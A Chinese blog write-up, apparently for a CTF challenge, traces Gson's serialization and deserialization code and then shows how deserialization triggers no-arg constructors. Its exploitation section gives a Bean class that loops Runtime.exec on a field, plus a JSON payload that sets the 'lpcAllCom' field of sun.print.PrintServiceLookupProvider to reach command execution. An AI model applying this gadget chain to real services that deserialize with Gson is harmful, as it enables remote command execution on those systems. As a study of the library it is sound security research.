<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toJson</span><span class="params">(Object src, Type typeOfSrc, JsonWriter writer)</span> <span class="keyword">throws</span> JsonIOException &#123;</span><br><span class="line">  <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">  TypeAdapter&lt;Object&gt; adapter = (TypeAdapter&lt;Object&gt;) getAdapter(TypeToken.get(typeOfSrc));</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">oldLenient</span> <span class="operator">=</span> writer.isLenient();</span><br><span class="line">  writer.setLenient(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">oldHtmlSafe</span> <span class="operator">=</span> writer.isHtmlSafe();</span><br><span class="line">  writer.setHtmlSafe(htmlSafe);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">oldSerializeNulls</span> <span class="operator">=</span> writer.getSerializeNulls();</span><br><span class="line">  writer.setSerializeNulls(serializeNulls);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    adapter.write(writer, src);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>首先将对象类型Class封装进TypeToken对象后,调⽤ getAdapter⽅法获取TypeAdapter对象</p>
<p>跟进TypeAdapter对象</p>
<p>⾸先会去缓存中找，找到则直接返回对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Objects.requireNonNull(type, <span class="string">&quot;type must not be null&quot;</span>);</span><br><span class="line">TypeAdapter&lt;?&gt; cached = typeTokenCache.get(type);</span><br><span class="line"><span class="keyword">if</span> (cached != <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">  TypeAdapter&lt;T&gt; adapter = (TypeAdapter&lt;T&gt;) cached;</span><br><span class="line">  <span class="keyword">return</span> adapter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>往下这段,这个获取当前线程map,如果为null就创建一个hashmap,如果不为null,然后再获取我们尝试获取我们存在线程存储的class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;TypeToken&lt;?&gt;, TypeAdapter&lt;?&gt;&gt; threadCalls = threadLocalAdapterResults.get();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isInitialAdapterRequest</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (threadCalls == <span class="literal">null</span>) &#123;</span><br><span class="line">  threadCalls = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  threadLocalAdapterResults.set(threadCalls);</span><br><span class="line">  isInitialAdapterRequest = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// the key and value type parameters always agree</span></span><br><span class="line">  <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">  TypeAdapter&lt;T&gt; ongoingCall = (TypeAdapter&lt;T&gt;) threadCalls.get(type);</span><br><span class="line">  <span class="keyword">if</span> (ongoingCall != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ongoingCall;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>下⾯进⾏threadLocalAdapterResults、threadCalls的存放</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TypeAdapter&lt;T&gt; candidate = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  FutureTypeAdapter&lt;T&gt; call = <span class="keyword">new</span> <span class="title class_">FutureTypeAdapter</span>&lt;&gt;();</span><br><span class="line">  threadCalls.put(type, call);</span><br></pre></td></tr></table></figure>

<p>然后就遍历factories，也即TypeAdapterFactory的实现类，遍历触发create⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (TypeAdapterFactory factory : factories) &#123;</span><br><span class="line">        candidate = factory.create(<span class="built_in">this</span>, type);</span><br><span class="line">        <span class="keyword">if</span> (candidate != <span class="literal">null</span>) &#123;</span><br><span class="line">          call.setDelegate(candidate);</span><br><span class="line">          <span class="comment">// Replace future adapter with actual adapter</span></span><br><span class="line">          threadCalls.put(type, candidate);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>⽅法会返回⼀个TypeAdapter对象，跟进 ReflectiveTypeAdapterFactory对象其create⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectConstructor&lt;T&gt; constructor = constructorConstructor.get(type);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FieldReflectionAdapter</span>&lt;&gt;(constructor, getBoundFields(gson, type, raw, blockInaccessible, <span class="literal">false</span>));</span><br></pre></td></tr></table></figure>

<p>ConstructorConstructor#get⽅法下，会调⽤newDefaultConstructor⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterResult</span> <span class="variable">filterResult</span> <span class="operator">=</span> ReflectionAccessFilterHelper.getFilterResult(reflectionFilters, rawType);</span><br><span class="line">ObjectConstructor&lt;T&gt; defaultConstructor = newDefaultConstructor(rawType, filterResult);</span><br></pre></td></tr></table></figure>

<p>用来获取无参数构造方法,如果用就会用无参数构造方法实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="comment">// T is the same raw type as is requested</span></span><br><span class="line">  <span class="type">T</span> <span class="variable">newInstance</span> <span class="operator">=</span> (T) constructor.newInstance();</span><br><span class="line">  <span class="keyword">return</span> newInstance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找不到则会往下调⽤newDefaultImplementationConstructor⽅法</p>
<p><code>ObjectConstructor&lt;T&gt; defaultImplementation = newDefaultImplementationConstructor(type, rawType);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (Collection.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (SortedSet.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Set.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Queue.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (Map.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ConcurrentNavigableMap.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">ConcurrentSkipListMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ConcurrentMap.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (SortedMap.class.isAssignableFrom(rawType)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType &amp;&amp; !(String.class.isAssignableFrom(</span><br><span class="line">        TypeToken.get(((ParameterizedType) type).getActualTypeArguments()[<span class="number">0</span>]).getRawType()))) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">LinkedTreeMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会判断是否是 map 集合等,是就会调用这些类的构造函数</p>
<p>再找不到，最后会调⽤newUnsafeAllocator⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (filterResult == FilterResult.ALLOW) &#123;</span><br><span class="line">  <span class="comment">// finally try unsafe</span></span><br><span class="line">  <span class="keyword">return</span> newUnsafeAllocator(rawType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法通过unsafe实例化对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;T&gt; ObjectConstructor&lt;T&gt; <span class="title function_">newUnsafeAllocator</span><span class="params">(<span class="keyword">final</span> Class&lt;? <span class="built_in">super</span> T&gt; rawType)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (useJdkUnsafe) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectConstructor</span>&lt;T&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">          <span class="type">T</span> <span class="variable">newInstance</span> <span class="operator">=</span> (T) UnsafeAllocator.INSTANCE.newInstance(rawType);</span><br><span class="line">          <span class="keyword">return</span> newInstance;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>((<span class="string">&quot;Unable to create instance of &quot;</span> + rawType + <span class="string">&quot;. &quot;</span></span><br><span class="line">              + <span class="string">&quot;Registering an InstanceCreator or a TypeAdapter for this type, or adding a no-args &quot;</span></span><br><span class="line">              + <span class="string">&quot;constructor may fix this problem.&quot;</span>), e);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>

<p>上⾯的对象实例化均指ObjectConstructor被触发construct方法的时候 </p>
<p>获取完ObjectConstructor后，先跟进getBoundFields⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (raw != Object.class) &#123;</span><br><span class="line">  Field[] fields = raw.getDeclaredFields();</span><br></pre></td></tr></table></figure>

<p>⽅法通过反射获取所有字段</p>
<p>然后通过ReflectionHelper.makeAccessible⽅法修改权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!blockInaccessible &amp;&amp; accessor == <span class="literal">null</span>) &#123;</span><br><span class="line">  ReflectionHelper.makeAccessible(field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后获取属性类型和名字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Type</span> <span class="variable">fieldType</span> <span class="operator">=</span> $Gson$Types.resolve(type.getType(), raw, field.getGenericType());</span><br><span class="line">List&lt;String&gt; fieldNames = getFieldNames(field);</span><br></pre></td></tr></table></figure>

<p>然后通过createBoundField⽅法获取BoundField对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, size = fieldNames.size(); i &lt; size; ++i) &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fieldNames.get(i);</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">0</span>) serialize = <span class="literal">false</span>; <span class="comment">// only serialize the default name</span></span><br><span class="line">  <span class="type">BoundField</span> <span class="variable">boundField</span> <span class="operator">=</span> createBoundField(context, field, accessor, name,</span><br><span class="line">      TypeToken.get(fieldType), serialize, deserialize, blockInaccessible);</span><br><span class="line">  <span class="type">BoundField</span> <span class="variable">replaced</span> <span class="operator">=</span> result.put(name, boundField);</span><br><span class="line">  <span class="keyword">if</span> (previous == <span class="literal">null</span>) previous = replaced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法内同样会触发Gson#getAdapter⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (mapped == <span class="literal">null</span>) mapped = context.getAdapter(fieldType);</span><br></pre></td></tr></table></figure>

<p>这⾥的Adapter就像是序列化器⼀样，最后将将属性名跟对应的BoundField对象存放进result</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">type = TypeToken.get($Gson$Types.resolve(type.getType(), raw, raw.getGenericSuperclass()));</span><br><span class="line">raw = type.getRawType();</span><br></pre></td></tr></table></figure>

<p>然后获取⽗类继续获取，返回result，将这个result封装进了FieldReflectionAdapter对象里，也就是上⼀层的candidate它作为返回值作为adapter对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  adapter.write(writer, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调⽤write方法执行序列化，beginObject⽅法开始写⼊</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JsonWriter <span class="title function_">beginObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  writeDeferredName();</span><br><span class="line">  <span class="keyword">return</span> open(EMPTY_OBJECT, <span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JsonWriter <span class="title function_">open</span><span class="params">(<span class="type">int</span> empty, <span class="type">char</span> openBracket)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  beforeValue();</span><br><span class="line">  push(empty);</span><br><span class="line">  out.write(openBracket);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先写{,再遍历boundField</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (BoundField boundField : boundFields.values()) &#123;</span><br><span class="line">    boundField.write(out, value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调⽤其write⽅法，利⽤反射获取值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">          fieldValue = field.get(source);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>后续会在TypeAdapterRuntimeTypeWrapper触发delegate变量的write⽅法，这⾥的 delegate变量就是上⾯经过存放的adapter对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JsonWriter <span class="title function_">value</span><span class="params">(String value)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> nullValue();</span><br><span class="line">  &#125;</span><br><span class="line">  writeDeferredName();</span><br><span class="line">  beforeValue();</span><br><span class="line">  string(value);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中writeDeferredName⽅法来写属性名，beforeValue加冒号，string(value)写值</p>
<p>总结：</p>
<p>⾸先是跟Adapter对象，自定义对象默认⽤FieldReflectionAdapter对象，然后属性 还原委派给TypeAdapterRuntimeTypeWrapper，它⼜会根据属性类型继续委派给对应 Adapter对象 序列化就是反射获取属性和值，然后写，过程并没有触发类的相关⽅法</p>
<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>老样子先将Class封装进TypeToken,⼀直跟</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  reader.peek();</span><br><span class="line">  isEmpty = <span class="literal">false</span>;</span><br><span class="line">  TypeAdapter&lt;T&gt; typeAdapter = getAdapter(typeOfT);</span><br><span class="line">  <span class="keyword">return</span> typeAdapter.read(reader);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里又会获取getAdapter,就又会像之前一样获取构造器类,返会getAdapter类</p>
<p>然后调⽤的是FieldReflectionAdapter#read⽅法</p>
<p><code>A accumulator = createAccumulator();</code></p>
<p>⾸先调⽤createAccumulator⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T <span class="title function_">createAccumulator</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> constructor.construct();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法触发先前封装的ObjectConstructor对象的construct⽅法 </p>
<p>也就是说，当对象所属类存在⽆参构造⽅法则通过⽆参构造⽅法进⾏实例化，否则通过 unsafe进⾏实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    in.beginObject();</span><br><span class="line">    <span class="keyword">while</span> (in.hasNext()) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> in.nextName();</span><br><span class="line">      <span class="type">BoundField</span> <span class="variable">field</span> <span class="operator">=</span> boundFields.get(name);</span><br><span class="line">      <span class="keyword">if</span> (field == <span class="literal">null</span> || !field.deserialized) &#123;</span><br><span class="line">        in.skipValue();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        readField(accumulator, in, field);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">catch</span> (IllegalStateException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JsonSyntaxException</span>(e);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> ReflectionHelper.createExceptionForUnexpectedIllegalAccess(e);</span><br><span class="line">  &#125;</span><br><span class="line">  in.endObject();</span><br><span class="line">  <span class="keyword">return</span> finalize(accumulator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>紧接着为对象还原属性</p>
<p>最后通过反射为对象设置值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">field.set(target, fieldValue);</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为题目环境是19的,但是我是windows版的</p>
<p>利⽤unsafe的话会通过allocateInstance⽅法来实例化对象，这种实例化方式会⽆视构造方法直接实例化对象。</p>
<p>Hint：constructor → Runtim.getRuntime().exec() </p>
<p>1ue师傅提供了⼀种思路，⽆参构造⽅法如何想办法控制参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="title function_">Bean</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">Thread</span> <span class="variable">thr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span> (() -&gt; &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">					Runtime.getRuntime().exec(name);</span><br><span class="line">				&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		thr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">		thr.start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个构造方法新建了⼀个线程，线程会反复执⾏外部参数的命令 在Gson反序列化中，会先执⾏这个构造⽅法，最后反射修改了Field后就能执⾏到恶意命 令 JDK11下，有⼀个sun.print.PrintServiceLookupProvider的类<br>我这里是windows版的,赛题是kali的</p>
<p>其无参构造方法会起2个线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PrintServiceLookupProvider</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (win32PrintLUS == <span class="literal">null</span>) &#123;</span><br><span class="line">        win32PrintLUS = <span class="built_in">this</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// start the local printer listener thread</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">PrinterChangeListener</span>(),</span><br><span class="line">                                <span class="string">&quot;PrinterListener&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">        thr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">        thr.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// start the remote printer listener thread</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">remThr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">RemotePrinterChangeListener</span>(),</span><br><span class="line">                                   <span class="string">&quot;RemotePrinterListener&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">        remThr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">        remThr.start();</span><br><span class="line">    &#125; <span class="comment">/* else condition ought to never happen! */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认<code>win32PrintLUS</code>就是为null</p>
<p>这⾥实例化了⼀个PrinterChangeListener内部类作为target，最后执⾏Thread#strat⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    start0();</span><br><span class="line">    started = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法会调⽤start0，start0是⼀个底层C实现的⽅法，他会触发Thread#run⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">        target.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是执⾏PrinterChangeListener#run⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">PrinterChangeListener</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        notifyLocalPrinterChange(); <span class="comment">// busy loop in the native code</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现会调用本地的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">notifyLocalPrinterChange</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p>而在linux中</p>
<p><img src="https://baicany.github.io/images/image-20231103193218165.png" alt="image-20231103193218165"></p>
<p>pollServices默认为true 这⾥实例化了⼀个PrinterChangeListener内部类作为target，最后执⾏Thread#strat⽅法</p>
<p>跟上面一样会调用run方法</p>
<p><img src="https://baicany.github.io/images/image-20231103193306135.png" alt="image-20231103193306135"></p>
<p>⽅法内同样⽤while true写死，调⽤refreshServices⽅法 CUPSPrinter.isCupsRunning⽅法指⽰CUPS是否正在运⾏。如果题⽬环境返回false，则 会⾛else语句</p>
<p><img src="https://baicany.github.io/images/image-20231103193359913.png" alt="image-20231103193359913"></p>
<p>⽅法下会根据操作系统执⾏对应⽅法，Liunx下的话会调⽤getAllPrinterNamesBSD⽅法</p>
<p><img src="https://baicany.github.io/images/image-20231103193421748.png" alt="image-20231103193421748"></p>
<p>⽅法下的execCmd会执⾏命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">proc=Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<p>这⾥这种利⽤思路同上述事例，这⾥会起⼀个内部类作为新线程，拼接外部类的成员变量 进⾏命令执⾏</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;lpcAllCom&quot;</span>: [</span><br><span class="line">		<span class="string">&quot;shell&quot;</span></span><br><span class="line">		<span class="string">&quot;shell&quot;</span></span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这⾥为什么要写两个，原因可能如下</p>
<p><img src="https://baicany.github.io/images/image-20231103194224365.png" alt="image-20231103194224365"></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-Theme-Sakura</title>
    <url>/2022/12/12/Hexo-Theme-Sakura/</url>
    <content><![CDATA[<p>hexo-theme-sakura主题 <a href="https://github.com/honjun/hexo-theme-sakura/blob/master/README.md">English document</a></p>
